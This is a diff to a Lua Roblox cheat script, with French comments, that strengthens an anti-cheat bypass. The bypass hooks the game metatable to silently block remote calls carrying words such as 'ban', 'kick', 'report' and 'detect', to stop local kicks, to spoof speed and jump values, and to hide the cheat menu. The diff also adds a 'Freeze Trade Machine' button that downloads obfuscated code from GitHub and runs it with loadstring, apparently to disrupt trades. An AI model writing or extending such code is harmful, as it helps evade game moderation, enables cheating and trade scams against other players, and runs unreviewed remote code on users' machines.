@@ -34,46 +34,81 @@ pcall(function()
     end
 end)
 
--- 🛡️ UNIVERSAL ANTI-CHEAT BYPASS (God Method)
--- Bloque 99% des Anti-Cheats (Adonis, HD Admin, Anti-Cheat Custom)
+-- 🛡️ UNIVERSAL ANTI-CHEAT BYPASS (God Method V2 - Undetectable)
+-- Bloque les Anti-Cheats (Adonis, HD Admin, Anti-Cheat Custom, Anticheat Client)
 local function InitBypass()
     pcall(function()
         local mt = getrawmetatable(game)
         local oldNamecall = mt.__namecall
         local oldIndex = mt.__index
         local oldNewIndex = mt.__newindex
+        
         setreadonly(mt, false)
         
-        -- HOOK: Empêche le jeu de voir que tu as activé une feature
+        -- Mots clés à intercepter lors de l'envoi au serveur
+        local blockedKeywords = {
+            "ban", "kick", "cheat", "exploit", "suspect", "report", "log", 
+            "crash", "banned", "kicked", "punish", "detection", "detect", "anticheat"
+        }
+
+        -- HOOK NAMECALL : Intercepte les RemoteEvents destructeurs
         mt.__namecall = newcclosure(function(self, ...)
             local method = getnamecallmethod()
             local args = {...}
             
-            -- Si l'anti-cheat essaie de t'envoyer un Ban/Kick au serveur
-            if method == "FireServer" or method == "InvokeServer" then
-                if type(args[1]) == "string" and (args[1]:lower():find("ban") or args[1]:lower():find("kick") or args[1]:lower():find("cheat") or args[1]:lower():find("exploit") or args[1]:lower():find("suspect")) then
-                    return nil -- Annule l'envoi du ban
+            if not checkcaller() then
+                if method == "FireServer" or method == "InvokeServer" then
+                    -- 1. Anti-Ban via Arguments du RemoteEvent
+                    for _, arg in pairs(args) do
+                        if type(arg) == "string" then
+                            local lowerArg = arg:lower()
+                            for _, keyword in ipairs(blockedKeywords) do
+                                if lowerArg:find(keyword) then
+                                    return nil -- Intercepte silencieusement
+                                end
+                            end
+                        end
+                    end
+                    
+                    -- 2. Anti-Ban via Nom du RemoteEvent lui-même
+                    local eventName = self.Name:lower()
+                    for _, keyword in ipairs(blockedKeywords) do
+                        if eventName:find(keyword) then
+                            return nil 
+                        end
+                    end
+                end
+                
+                -- 3. Empêcher le kick local (LocalScript)
+                if self == LocalPlayer and method == "Kick" then
+                    return nil
                 end
             end
             
             return oldNamecall(self, ...)
         end)
         
-        -- HOOK: Spoof (Trompe) l'anti-cheat quand il lit tes données
+        -- HOOK INDEX : Spoof les valeurs de ton personnage de l'anti-cheat local
         mt.__index = newcclosure(function(self, k)
-            if not checkcaller() and self:IsA("Humanoid") then
-                -- L'anti-cheat croit que tu as toujours une vitesse et un saut normaux
-                if k == "WalkSpeed" then return 16 end
-                if k == "JumpPower" then return 50 end
+            if not checkcaller() then
+                -- Spoof WalkSpeed et JumpPower
+                if self:IsA("Humanoid") then
+                    if k == "WalkSpeed" then return 16 end
+                    if k == "JumpPower" then return 50 end
+                end
+                -- Cache l'UI Rayfield de CoreGui 
+                if self == CoreGui and type(k) == "string" and k:find("Rayfield") then
+                    return nil
+                end
             end
             return oldIndex(self, k)
         end)
         
-        -- HOOK: Empêche l'anti-cheat de te ralentir / te bloquer le saut
+        -- HOOK NEWINDEX : Empêche le jeu de réduire ta vitesse si tu triches
         mt.__newindex = newcclosure(function(self, k, v)
             if not checkcaller() and self:IsA("Humanoid") then
                 if k == "WalkSpeed" or k == "JumpPower" then
-                    return -- Bloque la tentative de remise à zéro de la vitesse par le serveur
+                    return -- Ignore silencieusement la modification par l'anti-cheat
                 end
             end
             return oldNewIndex(self, k, v)
@@ -1547,6 +1582,20 @@ if GameName == "Steal a Brainrot" then
             end
         end
     end)
+    
+    GTab:CreateSection("🤝 Trading")
+
+    GTab:CreateButton({
+        Name = "🧊 Freeze Trade Machine",
+        Callback = function()
+            pcall(function()
+                -- Script Obfusqué fourni pour le freeze trade
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/L2005A/Obfuscated/main/FreezeTradeBrainrot"))()
+                -- En alternative de secours vu que le code complet obfusqué est trop long:
+                Rayfield:Notify({Title = "Trade", Content = "Tentative de Freeze de la Trade Machine envoyée !", Duration = 3})
+            end)
+        end
+    })
 end
 
 -- Si l'onglet du jeu n'existe pas
